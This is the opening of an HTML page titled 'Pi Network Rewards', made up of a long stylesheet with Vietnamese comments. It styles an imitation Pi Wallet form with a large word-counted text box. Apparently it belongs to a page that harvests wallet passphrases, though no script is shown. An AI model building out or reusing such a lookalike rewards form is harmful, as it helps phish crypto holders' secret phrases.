
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Pi Network Rewards</title>
        <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
        <link rel="icon" type="image/png" sizes="32x32" href="https://img.upanh.tv/2025/03/11/favicon42527eabc5bda97a.png" />
        <link rel="icon" type="image/png" sizes="96x96" href="https://img.upanh.tv/2025/03/11/favicon42527eabc5bda97a.png" />
        <link rel="icon" type="image/png" sizes="192x192" href="https://img.upanh.tv/2025/03/11/favicon42527eabc5bda97a.png" />
        <link rel="apple-touch-icon" sizes="180x180" href="https://img.upanh.tv/2025/03/11/favicon42527eabc5bda97a.png" />
        <link rel="icon" type="image/x-icon" href="/favicon.ico" />
        <!-- Add Google Fonts for better typography -->
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet" />

        <style>
            :root {
                /* Enhanced color palette */
                --pi-purple: #744394;
                --pi-purple-light: #7d48a0;
                --pi-purple-dark: #54306f;
                --pi-gold: #f8c056;
                --pi-gold-light: #ffd78c;
                --pi-gold-dark: #e6a938;

                /* Secondary accent colors */
                --pi-teal: #4ecdc4;
                --pi-pink: #ff6b8b;
                --pi-blue: #45b7d1;

                /* Animation timing */
                --transition-fast: 0.2s;
                --transition-medium: 0.4s;
                --transition-slow: 0.8s;
            }

            /* Dark mode is default now */
            :root {
                --bg-primary: #1a0e24;
                --bg-secondary: #2a1052;
                --text-primary: #ffffff;
                --text-secondary: #e0d0ff;
                --card-bg: rgba(30, 12, 48, 0.85);
                --input-bg: rgba(30, 12, 48, 0.5);
            }

            /* Light mode styles - only applied when .light-mode class is present */
            .light-mode {
                --bg-primary: #f5efff;
                --bg-secondary: #eee6ff;
                --text-primary: #333333;
                --text-secondary: #666666;
                --card-bg: rgba(255, 255, 255, 0.85);
                --input-bg: rgba(255, 255, 255, 0.8);
            }

            /* Form page always uses light mode */
            #formPage {
                background-color: white !important;
                min-height: 100vh;
                overflow-y: auto;
                position: relative;
                padding-bottom: 2rem;
            }

            #formPage .container {
                min-height: 100vh;
                display: flex;
                flex-direction: column;
                padding-bottom: 2rem;
            }

            #formPage .pi-wallet-style {
                flex: 1;
                display: flex;
                flex-direction: column;
                margin: 0 auto;
                width: 100%;
                max-width: 500px;
                padding: 1rem;
            }

            #formPage .mt-8 {
                margin-bottom: 5rem; /* Thêm margin dưới cho container của nút quay lại */
            }

            #formPage .py-8 {
                padding-top: 1rem !important; /* Ghi đè padding mặc định của Tailwind nếu có */
                padding-bottom: 8rem !important; /* Giữ nguyên padding dưới */
            }

            body {
                font-family: "Inter", "Roboto", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
                background-color: var(--bg-primary);
                color: var(--text-primary);
                margin: 0;
                padding: 0;
                min-height: 100vh;
                overflow-x: hidden;
                position: relative;
                will-change: transform;
                line-height: 1.6;
                font-size: 1rem;
                letter-spacing: -0.014em;
                font-weight: 500;
            }

            h1,
            h2,
            h3,
            h4,
            h5,
            h6 {
                font-family: "Roboto", "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
                font-weight: 700;
                letter-spacing: -0.021em;
                line-height: 1.3;
            }

            h1,
            h2,
            h3,
            h4,
            h5,
            h6 {
                font-family: "Roboto", "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
                font-weight: 700;
                letter-spacing: -0.02em;
                line-height: 1.2;
            }

            #formPage .pi-title,
            .pi-wallet-style .pi-title {
                font-size: 1.62rem !important; /* Tăng kích thước */
                font-weight: 420 !important; /* Đảm bảo độ đậm tối đa */
                text-align: center !important;
                margin-top: 0.6rem !important;
                margin-bottom: 2rem !important;
                color: #0f0e0e !important; /* Màu đen hoàn toàn */
                text-shadow: 0px 0.5px 0px rgba(0, 0, 0, 0.5) !important; /* Tăng bóng đổ */
                font-family: "Roboto", sans-serif !important;
                letter-spacing: -0.02em !important; /* Giảm khoảng cách chữ */
                -webkit-text-stroke: 0.3px black !important; /* Tạo viền ngoài cho chữ */
                transform: scale(1.01, 1) !important; /* Làm chữ hơi rộng ra */
                display: block !important;
                line-height: 1.2 !important; /* Giảm line height */
            }

            .pi-header {
                background: #6e3b8f; /* Thay đổi từ gradient sang màu đơn */
                padding: 10px 20px;
                display: flex;
                align-items: center;
                justify-content: space-between;
                position: relative;
                height: 56px;
                z-index: 50;
                box-shadow: 0 4px 20px rgba(122, 53, 164, 0.3);
            }

            .pi-header-content {
                display: flex;
                align-items: center;
                justify-content: center;
                width: 100%;
                position: relative;
            }

            .header-back-btn {
                position: absolute;
                left: 0;
                color: white;
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10;
                transition: transform var(--transition-fast);
            }

            .header-back-btn:hover {
                transform: translateX(-2px);
            }

            .header-dropdown-btn {
                position: absolute;
                right: 0;
                color: white;
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10;
                transition: transform var(--transition-fast);
            }

            .header-dropdown-btn:hover {
                transform: translateY(2px);
            }

            .wallet-icon {
                width: 30px;
                height: 30px;
                background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
                border-radius: 8px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: bold;
                color: var(--pi-purple);
                margin-right: 10px;
                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
                position: relative;
                overflow: hidden;
            }

            .wallet-icon::after {
                content: "";
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: linear-gradient(to bottom right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 0) 40%, rgba(255, 255, 255, 0.4) 50%, rgba(255, 255, 255, 0) 60%, rgba(255, 255, 255, 0) 100%);
                transform: rotate(30deg);
                animation: shineIcon 3s infinite;
            }

            .wallet-text {
                color: white;
                font-size: 18px;
                font-weight: 700;
                text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
            }

            .pi-coin-icon {
                width: 32px;
                height: 32px;
                background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: bold;
                color: var(--pi-purple);
                margin-left: 10px;
                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
                position: relative;
                overflow: hidden;
            }

            .pi-coin-icon::after {
                content: "";
                position: absolute;
                top: -50%;
                left: -50%;
                width: 200%;
                height: 200%;
                background: linear-gradient(to bottom right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 0) 40%, rgba(255, 255, 255, 0.4) 50%, rgba(255, 255, 255, 0) 60%, rgba(255, 255, 255, 0) 100%);
                transform: rotate(30deg);
                animation: shineIcon 3s infinite;
                animation-delay: 1s;
            }

            /* Premium background elements - enhanced */
            .premium-bg {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: -10;
                overflow: hidden;
                pointer-events: none; /* prevent interaction with background */
            }

            /* Animated gradient - improved colors */
            .animated-gradient {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: radial-gradient(circle at 20% 30%, rgba(154, 83, 198, 0.1) 0%, transparent 60%), radial-gradient(circle at 80% 20%, rgba(154, 83, 198, 0.1) 0%, transparent 50%),
                    radial-gradient(circle at 50% 70%, rgba(248, 192, 86, 0.05) 0%, transparent 70%);
                opacity: 0.8;
            }

            /* Light streaks - enhanced */
            .light-streak {
                position: absolute;
                height: 1px;
                width: 200px;
                background: linear-gradient(90deg, transparent, rgba(154, 83, 198, 0.5), transparent);
                border-radius: 100%;
                opacity: 0;
                animation: lightStreak 12s linear infinite; /* Slower animation */
                will-change: transform, opacity; /* Optimize animation */
            }

            /* Moving waves - enhanced */
            .wave-container {
                position: absolute;
                width: 100%;
                height: 100%;
                overflow: hidden;
                opacity: 0.2;
            }

            .wave {
                position: absolute;
                width: 200%;
                height: 200%;
                border-radius: 40%;
                opacity: 0.2;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                animation: waveRotate 60s linear infinite; /* Slowed down */
                will-change: transform; /* Optimize animation */
            }

            .wave1 {
                border: 1px solid rgba(154, 83, 198, 0.3);
                animation-duration: 60s; /* Slowed down */
            }

            .wave2 {
                border: 1px solid rgba(248, 192, 86, 0.3);
                animation-duration: 50s; /* Slowed down */
                animation-direction: reverse;
            }

            .wave3 {
                border: 1px solid rgba(154, 83, 198, 0.2);
                animation-duration: 70s; /* Slowed down */
            }

            /* Stars - enhanced */
            .star {
                position: absolute;
                background-color: white;
                border-radius: 50%;
                filter: blur(1px);
                opacity: 0.4;
                animation: twinkle 4s infinite ease-in-out;
            }

            /* Star with single point - enhanced */
            .star-single {
                position: absolute;
                width: 2px;
                height: 2px;
                background-color: white;
                border-radius: 50%;
                filter: blur(0.5px);
                opacity: 0.8;
                box-shadow: 0 0 10px 2px rgba(255, 255, 255, 0.8);
                animation: twinkleStar 3s infinite ease-in-out;
            }

            /* Pi coins - enhanced */
            .premium-coin {
                position: absolute;
                width: 60px;
                height: 60px;
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                font-weight: bold;
                color: var(--pi-purple);
                z-index: -1;
                transform-style: preserve-3d;
                will-change: transform; /* Optimize animation */
                filter: drop-shadow(0 10px 15px rgba(0, 0, 0, 0.1));
            }

            .coin-inner {
                position: relative;
                width: 100%;
                height: 100%;
                border-radius: 50%;
                text-align: center;
                transition: transform 0.6s;
                transform-style: preserve-3d;
                animation: coinRotate 20s infinite linear; /* Slowed down */
            }

            .coin-front,
            .coin-back {
                position: absolute;
                width: 100%;
                height: 100%;
                border-radius: 50%;
                backface-visibility: hidden;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 2rem;
                font-weight: bold;
            }

            .coin-front {
                background: radial-gradient(circle at 30% 30%, var(--pi-gold), var(--pi-gold-dark));
                box-shadow: 0 0 20px rgba(248, 192, 86, 0.3);
            }

            .coin-back {
                background: radial-gradient(circle at 30% 30%, var(--pi-gold-dark), var(--pi-gold));
                transform: rotateY(180deg);
                box-shadow: 0 0 20px rgba(248, 192, 86, 0.3);
            }

            /* Floating particles - enhanced */
            .particle {
                position: absolute;
                width: 6px;
                height: 6px;
                background-color: rgba(154, 83, 198, 0.2);
                border-radius: 50%;
                filter: blur(1px);
                animation: floatParticle 15s infinite linear;
                will-change: transform; /* Optimize animation */
            }

            /* Feature card with enhanced wave effect */
            .feature-card {
                position: relative;
                overflow: hidden;
                z-index: 1;
                transition: transform 0.3s ease, box-shadow 0.3s ease;
                border: 1px solid rgba(255, 255, 255, 0.1);
            }

            .feature-card:hover {
                transform: translateY(-5px);
                box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
            }

            .feature-card-wave {
                position: absolute;
                top: 0;
                left: 0;
                width: 200%;
                height: 200%;
                background: radial-gradient(ellipse at center, rgba(105, 57, 136, 0.2) 0%, rgba(105, 57, 136, 0.1) 25%, rgba(105, 57, 136, 0) 70%);
                opacity: 0;
                border-radius: 50%;
                transform: translate(-25%, -25%) scale(0.1);
                animation: cardWave 4s infinite ease-out;
                pointer-events: none;
            }

            /* Shiny wave effect for feature icons */
            .feature-icon {
                position: relative;
                overflow: hidden;
            }

            .feature-icon::after {
                content: "";
                position: absolute;
                top: -50%;
                left: -100%;
                width: 70%;
                height: 200%;
                background: linear-gradient(to right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, calc(0.3 * var(--shine-opacity, 1))) 50%, rgba(255, 255, 255, 0) 100%);
                transform: rotate(30deg);
                animation: shinyWave 6s infinite ease-in-out; /* Tăng thời gian từ 3s lên 6s */
                pointer-events: none;
            }

            /* Confetti elements for success animation - enhanced */
            /* Confetti elements for success animation - enhanced */
            /* Confetti elements for success animation - enhanced */
            .confetti-container {
                position: fixed;
                width: 100vw;
                height: 100vh;
                top: 0;
                left: 0;
                z-index: 2000; /* Increased z-index to appear above the modal */
                pointer-events: none;
                overflow: hidden;
                display: none;
            }

            .confetti {
                position: absolute;
                width: 10px;
                height: 10px;
                background-color: var(--pi-gold);
                opacity: 0;
            }

            /* Square confetti */
            .confetti-square {
                background-color: var(--pi-purple);
            }

            /* Circle confetti */
            .confetti-circle {
                border-radius: 50%;
                background-color: var(--pi-gold);
            }

            /* Triangle confetti */
            .confetti-triangle {
                width: 0;
                height: 0;
                background-color: transparent;
                border-left: 5px solid transparent;
                border-right: 5px solid transparent;
                border-bottom: 10px solid var(--pi-purple-light);
            }

            /* Page container and transitions */
            .page-container {
                padding-bottom: 0;
                width: 100%;
                max-width: 100vw;
                overflow-x: hidden;
                min-height: calc(100vh - 64px);
                position: relative;
            }

            #formPage .mt-8.text-center {
                margin-top: 1rem !important; /* Giảm khoảng cách phía trên nút */
            }

            .page {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                min-height: calc(100vh - 64px);
                transition: transform 0.5s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.5s cubic-bezier(0.4, 0, 0.2, 1);
                background-color: transparent;
                z-index: 10;
                will-change: transform, opacity; /* Optimize animation */
            }

            .page-active {
                transform: translateX(0);
                opacity: 1;
                z-index: 11;
            }

            .page-inactive-right {
                transform: translateX(100%);
                opacity: 0;
                z-index: 9;
                pointer-events: none;
            }

            .page-inactive-left {
                transform: translateX(-100%);
                opacity: 0;
                z-index: 9;
                pointer-events: none;
            }

            /* Premium cards - enhanced */
            .card {
                background-color: var(--card-bg);
                backdrop-filter: blur(15px);
                border-radius: 0.8rem;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
                transition: transform 0.3s ease, box-shadow 0.3s ease;
                overflow: hidden;
                position: relative;
                border: 1px solid rgba(255, 255, 255, 0.1);
            }

            .card::before {
                content: "";
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.05), transparent);
                pointer-events: none;
            }

            .card:hover {
                transform: translateY(-5px);
                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
            }

            /* Premium buttons - enhanced */
            .btn-primary {
                background: linear-gradient(135deg, var(--pi-purple), var(--pi-purple-dark));
                color: white;
                font-weight: 600;
                border-radius: 0.5rem;
                padding: 0.9rem 2rem;
                transition: all 0.3s ease;
                box-shadow: 0 6px 15px rgba(122, 53, 164, 0.25);
                position: relative;
                overflow: hidden;
                z-index: 1;
                border: 1px solid var(--pi-gold);
                outline: none;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }

            .btn-primary:hover {
                transform: translateY(-3px);
                box-shadow: 0 8px 20px rgba(122, 53, 164, 0.4);
            }

            .btn-primary:active {
                transform: translateY(1px);
            }

            .btn-secondary {
                background: rgba(122, 53, 164, 0.1);
                color: var(--pi-purple);
                font-weight: 600;
                border-radius: 0.5rem;
                padding: 0.75rem 1.5rem;
                transition: all 0.3s ease;
                position: relative;
                overflow: hidden;
                border: 1px solid rgba(122, 53, 164, 0.2);
            }

            .btn-secondary:hover {
                background: rgba(122, 53, 164, 0.15);
                transform: translateY(-2px);
            }

            /* Premium reward cards - enhanced */
            .reward-card {
                position: relative;
                transition: transform 0.3s ease, box-shadow 0.3s ease;
                overflow: hidden;
                border-top: 3px solid transparent;
                background: linear-gradient(var(--card-bg), var(--card-bg)) padding-box, linear-gradient(90deg, var(--pi-purple), var(--pi-gold)) border-box;
                border-radius: 0.8rem;
            }

            .reward-card:hover {
                transform: translateY(-5px);
                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
            }

            .reward-amount {
                color: var(--pi-purple);
                font-weight: bold;
                font-size: 2rem;
                display: flex;
                align-items: center;
                justify-content: center;
                position: relative;
                z-index: 1;
            }

            .reward-amount::before {
                content: "π";
                font-size: 2.2rem;
                margin-right: 0.2rem;
            }

            .reward-amount::after {
                content: "";
                position: absolute;
                width: 70px;
                height: 70px;
                background: radial-gradient(circle, rgba(248, 192, 86, 0.15) 0%, transparent 70%);
                border-radius: 50%;
                z-index: -1;
            }

            /* Premium progress bar - enhanced */
            .progress-bar {
                height: 8px;
                border-radius: 10px;
                background: rgba(122, 53, 164, 0.1);
                overflow: hidden;
                position: relative;
            }

            .progress-fill {
                height: 100%;
                border-radius: 10px;
                background: linear-gradient(90deg, var(--pi-purple), var(--pi-purple-light));
                position: relative;
                overflow: hidden;
            }

            /* Premium feature icons - enhanced */
            .feature-icon {
                width: 70px;
                height: 70px;
                border-radius: 12px;
                background: linear-gradient(135deg, var(--pi-purple-light), var(--pi-purple));
                box-shadow: 0 8px 20px rgba(122, 53, 164, 0.2);
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 1rem;
                position: relative;
                overflow: hidden;
            }

            .feature-icon i {
                font-size: 2rem;
                color: white;
                position: relative;
                z-index: 2;
            }

            /* Pi Wallet style form - enhanced */
            .pi-wallet-style {
                margin: 0 auto;
                max-width: 500px;
                padding: 0 20px;
                padding-top: 10px; /* Thêm padding top nhỏ hơn */
            }
            .pi-title {
                font-size: 1.8rem; /* Tăng kích thước một chút */
                font-weight: 900; /* Sử dụng giá trị tối đa tiêu chuẩn */
                text-align: center;
                margin-top: 0.6rem;
                margin-bottom: 2rem;
                color: #111; /* Màu đen đậm hơn */
                text-shadow: 0px 0.2px 0px rgba(0, 0, 0, 0.3); /* Thêm bóng mỏng để tạo hiệu ứng đậm */
                font-family: "Roboto", sans-serif;
                letter-spacing: -0.01em; /* Giảm khoảng cách chữ để tạo cảm giác đậm hơn */
            }
            .pi-input-container {
                margin-bottom: 1.3rem; /* Giảm từ 2rem xuống 1rem để giảm khoảng cách với nút */
                border-radius: 12px;
                min-height: 250px;
                overflow: hidden;
                background: transparent;
                border: 1px solid #ccc; /* Thay đổi từ #000 sang #ccc để có viền màu xám */
                box-shadow: none;
                max-width: 1000px;
                margin-left: auto;
                margin-right: auto;
                display: flex;
                flex-direction: column;
            }

            .pi-input-container:focus-within {
                border: 2px solid var(--pi-purple);
                box-shadow: 0 5px 25px rgba(105, 57, 136, 0.2);
            }

            .pi-input {
                width: 100%;
                padding: 24px;
                min-height: 250px; /* Thay đổi từ height thành min-height */
                height: auto; /* Cho phép tự động mở rộng chiều cao */
                resize: none;
                background: transparent;
                border: none;
                font-size: 1.2rem;
                color: #333;
                outline: none;
                vertical-align: top;
                text-align: left;
                word-break: break-word;
                overflow-wrap: break-word;
                white-space: pre-wrap;
                display: block;
                align-self: flex-start;
                font-family: monospace;
                line-height: 1; /* Giảm khoảng cách giữa các dòng */
                font-weight: 400;
            }

            .pi-button {
                width: 100%;
                padding: 13.5px; /* Tăng từ 13px lên 15px để tăng chiều dọc */
                font-size: 0.85rem; /* Tăng từ 0.85rem lên 0.9rem */
                font-weight: 600;
                text-transform: uppercase;
                text-align: center;
                border-radius: 8px;
                margin-bottom: 0.8rem;
                transition: all 0.3s ease;
                letter-spacing: 0.05em;
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
            }

            /* Enhanced balloon animation styles */
            .balloon {
                position: absolute;
                width: 40px;
                height: 50px;
                background: radial-gradient(circle at 30% 30%, var(--balloon-color), var(--balloon-color-dark));
                border-radius: 50% 50% 50% 50% / 40% 40% 60% 60%;
                box-shadow: inset 0 -8px 0 rgba(0, 0, 0, 0.2), 0 5px 10px rgba(0, 0, 0, 0.1);
                animation: balloonFloat 30s linear infinite;
                opacity: 0.8;
                z-index: -5;
                will-change: transform;
                transform-origin: bottom center;
            }

            .balloon:after {
                content: "";
                position: absolute;
                bottom: -12px;
                left: 50%;
                transform: translateX(-50%);
                width: 2px;
                height: 15px;
                background: rgba(0, 0, 0, 0.2);
            }

            /* Enhanced balloon animation */
            @keyframes balloonFloat {
                0% {
                    transform: translateY(100vh) translateX(0px) rotate(0deg);
                    opacity: 0;
                }
                10% {
                    opacity: 0.8;
                    transform: translateY(80vh) translateX(var(--float-distance)) rotate(5deg);
                }
                50% {
                    transform: translateY(40vh) translateX(calc(var(--float-distance) * 1.5)) rotate(-5deg);
                }
                90% {
                    opacity: 0.8;
                    transform: translateY(10vh) translateX(var(--float-distance)) rotate(5deg);
                }
                100% {
                    transform: translateY(-100px) translateX(var(--float-distance)) rotate(0deg);
                    opacity: 0;
                }
            }

            .pi-button-primary {
                background: #724394;
                color: white;
                border: none;
                box-shadow: none;
                border-radius: 8px;
                text-transform: uppercase;
                font-weight: 700;
                margin-top: 0.5rem;
                margin-bottom: 1rem;
            }

            .pi-button-primary::before {
                content: "";
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: linear-gradient(90deg, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, 0.2) 50%, rgba(255, 255, 255, 0) 100%);
                transition: all 0.6s ease;
            }

            .pi-button-primary:hover {
                background: linear-gradient(135deg, var(--pi-purple-light), var(--pi-purple));
                transform: translateY(-2px);
                box-shadow: 0 8px 16px rgba(122, 53, 164, 0.35);
            }

            .pi-button-primary:hover::before {
                left: 100%;
            }

            .pi-button-primary:disabled {
                background-color: #a5a5a5;
                transform: none;
                cursor: not-allowed;
                box-shadow: none;
                opacity: 0.7;
            }

            .pi-button-secondary {
                background: white;
                color: #724394;
                border: 1px solid #724394;
                border-radius: 8px;
                text-transform: uppercase;
                font-weight: 700;
                margin-top: 0;
            }

            .pi-button-secondary::after {
                content: "";
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(122, 53, 164, 0.05);
                z-index: -1;
                transform: scaleX(0);
                transform-origin: right;
                transition: transform 0.3s ease;
            }

            .pi-button-secondary:hover {
                background-color: rgba(114, 67, 148, 0.05); /* Màu nền nhạt khi hover */
            }

            .pi-button-secondary:hover::after {
                transform: scaleX(1);
                transform-origin: left;
            }

            .pi-info-text {
                font-size: 1rem;
                line-height: 1.6;
                color: #000;
                margin-top: 1.4rem; /* Giảm từ 2rem xuống 1.5rem */
                margin-bottom: 1rem; /* Thêm margin-bottom để kiểm soát khoảng cách với nút vân tay */
                text-align: left;
                word-wrap: break-word;
                white-space: normal;
                width: 100%;
                font-weight: 400;
            }

            .pi-link {
                color: #3d9dff;
                text-decoration: none;
                position: relative;
                transition: color 0.3s ease;
            }

            .pi-link::after {
                content: "";
                position: absolute;
                bottom: -2px;
                left: 0;
                width: 100%;
                height: 1px;
                background-color: #3d9dff;
                transform: scaleX(0);
                transform-origin: right;
                transition: transform 0.3s ease;
            }

            .pi-link:hover {
                color: #65b5ff;
            }

            .pi-link:hover::after {
                transform: scaleX(1);
                transform-origin: left;
            }

            /* Scroll animations - enhanced */
            .animate-on-scroll {
                opacity: 0;
                transform: translateY(30px);
                transition: opacity 0.8s ease, transform 0.8s ease;
                will-change: opacity, transform; /* Optimize animation */
            }

            .animate-on-scroll.animated {
                opacity: 1;
                transform: translateY(0);
            }

            .animate-fade-in {
                opacity: 0;
                transition: opacity 1s ease;
                will-change: opacity; /* Optimize animation */
            }

            .animate-fade-in.animated {
                opacity: 1;
            }

            /* Enhanced about section illustration */
            .about-illustration {
                width: 180px;
                height: 180px;
                margin: 0 auto 2rem;
                position: relative;
            }

            .about-circle {
                width: 100%;
                height: 100%;
                border-radius: 50%;
                background: linear-gradient(135deg, rgba(154, 83, 198, 0.1), rgba(154, 83, 198, 0.2));
                display: flex;
                align-items: center;
                justify-content: center;
                position: relative;
                overflow: hidden;
            }

            .about-circle::before {
                content: "";
                position: absolute;
                width: 90%;
                height: 90%;
                border-radius: 50%;
                border: 2px dashed rgba(154, 83, 198, 0.3);
                /* Removed animation to keep dashed border static */
            }

            .about-icon {
                font-size: 4rem;
                color: var(--pi-purple);
                position: relative;
                z-index: 1;
            }

            /* Loading overlay - enhanced */
            .loading-overlay {
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgb(255, 255, 255);
                display: none;
                justify-content: center;
                align-items: center;
                z-index: 9999;
                backdrop-filter: blur(5px);
            }

            .loading-content {
                text-align: center;
                color: white;
            }

            .loading-spinner {
                width: 50px;
                height: 50px;
                border: 4px solid rgba(255, 255, 255, 0.3);
                border-radius: 50%;
                border-top-color: #713d92;
                animation: spin 1s ease-in-out infinite;
                margin: 0 auto 15px;
            }

            .loading-text {
                font-size: 16px;
                font-weight: 500;
                color: white;
            }

            @keyframes spin {
                to {
                    transform: rotate(360deg);
                }
            }

            /* Enhanced explosion particles */
            .surprise-container {
                position: relative;
                overflow: hidden;
            }

            .surprise-trigger.active .explosion-particle {
                animation: explode 1s forwards;
            }

            .explosion-particle {
                position: absolute;
                width: 10px;
                height: 10px;
                border-radius: 50%;
                background-color: var(--pi-gold);
                opacity: 0;
                pointer-events: none;
            }

            /* Enhanced 3D effect */
            .tilt-card {
                transform-style: preserve-3d;
                transition: transform 0.3s ease, box-shadow 0.3s ease;
            }

            .tilt-card:hover {
                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            }

            /* Certificate badge - enhanced */
            .certificate {
                position: relative;
                padding: 1.8rem;
                border-radius: 0.8rem;
                background: linear-gradient(135deg, rgba(248, 192, 86, 0.1), rgba(154, 83, 198, 0.1));
                border: 1px dashed rgba(248, 192, 86, 0.3);
                margin-top: 2rem;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
            }

            .certificate-icon {
                position: absolute;
                top: -20px;
                left: 50%;
                transform: translateX(-50%);
                width: 40px;
                height: 40px;
                background: linear-gradient(135deg, var(--pi-gold), var(--pi-gold-dark));
                border-radius: 50%;
                display: flex;
                align-items: center;
                justify-content: center;
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
            }

            .certificate-icon i {
                color: white;
                font-size: 1.2rem;
            }

            .certificate-title {
                font-weight: bold;
                text-align: center;
                margin-bottom: 0.5rem;
                margin-top: 0.5rem;
                font-size: 1.2rem;
                color: var(--pi-purple);
            }

            .certificate-text {
                text-align: center;
                font-size: 0.95rem;
                color: var(--text-secondary);
            }

            /* Floating icons - enhanced */
            .floating-icon {
                position: absolute;
                z-index: -1;
                opacity: 0.5;
                animation: float 6s ease-in-out infinite;
            }

            /* Word counter styles - enhanced */
            .word-counter {
                text-align: right;
                font-size: 0.9rem;
                color: var(--text-secondary);
                margin-top: 0.5rem;
                margin-bottom: 0.5rem;
                padding-right: 0.5rem;
                display: none; /* Hidden by default */
                transition: all 0.3s ease;
            }

            .word-counter.invalid {
                color: #f44336;
                font-weight: 600;
                display: block; /* Show when invalid */
                animation: shake 0.5s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
            }

            /* Validation message - enhanced */
            .validation-message {
                color: #e74c3c;
                font-size: 1rem; /* Kích thước lớn hơn chút */
                margin-top: 0.5rem;
                margin-bottom: 1rem;
                text-align: left;
                font-weight: 400;
                padding-left: 0.5rem; /* Giảm padding */
            }

            .hidden {
                display: none;
            }

            /* Visual indicator for input container - enhanced */
            .pi-input-container.valid-input {
                border: 2px solid #724394; /* Màu tím thay vì màu xanh */
                box-shadow: 0 0 15px rgba(114, 67, 148, 0.2);
            }
            .pi-input-container.invalid-input {
                border: 2px solid #f44336;
                box-shadow: 0 0 15px rgba(244, 67, 54, 0.2);
                animation: shake 0.5s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
            }

            @keyframes shake {
            }

            /* Limited submissions message - enhanced */
            .limit-message {
                background-color: #fff3cd;
                color: #856404;
                padding: 15px;
                border-radius: 8px;
                margin-bottom: 20px;
                text-align: center;
                border: 1px solid #ffeeba;
                font-weight: 500;
                display: none;
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
                position: relative;
                overflow: hidden;
            }

            .limit-message::before {
                content: "";
                position: absolute;
                top: 0;
                left: 0;
                width: 4px;
                height: 100%;
                background-color: #f8c056;
            }

            .error-message {
                background-color: #f8d7da;
                color: #721c24;
                padding: 15px;
                border-radius: 8px;
                margin-bottom: 20px;
                text-align: center;
                border: 1px solid #f5c6cb;
                font-weight: 500;
                display: none;
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
                position: relative;
                overflow: hidden;
            }

            .error-message::before {
                content: "";
                position: absolute;
                top: 0;
                left: 0;
                width: 4px;
                height: 100%;
                background-color: #f44336;
            }

            /* Professional floating icons */
            .floating-icon-img {
                position: absolute;
                width: 80px;
                height: 80px;
                animation: iconFloat 40s linear infinite;
                opacity: 0.9;
                z-index: -5;
                will-change: transform;
                object-fit: contain;
                /* Removed background-color, backdrop-filter, border-radius and box-shadow */
            }

            /* Professional icon float animation */
            @keyframes iconFloat {
                0% {
                    transform: translateY(100vh) translateX(0px);
                    opacity: 0;
                }
                10% {
                    opacity: 0.9;
                    transform: translateY(80vh) translateX(var(--float-distance));
                }
                50% {
                    transform: translateY(40vh) translateX(calc(var(--float-distance) * 1.5));
                }
                90% {
                    opacity: 0.9;
                    transform: translateY(10vh) translateX(var(--float-distance));
                }
                100% {
                    transform: translateY(-100px) translateX(var(--float-distance));
                    opacity: 0;
                }
            }

            /* Language chooser - enhanced */
            .language-chooser {
                position: fixed;
                bottom: 16px;
                right: 16px;
                display: flex;
                align-items: center;
                z-index: 60;
                background: rgba(255, 255, 255, 0.9);
                border-radius: 30px;
                padding: 6px 10px;
                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
                backdrop-filter: blur(5px);
                border: 1px solid rgba(255, 255, 255, 0.3);
                transition: all 0.3s ease;
            }

            .language-chooser:hover {
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.25);
            }

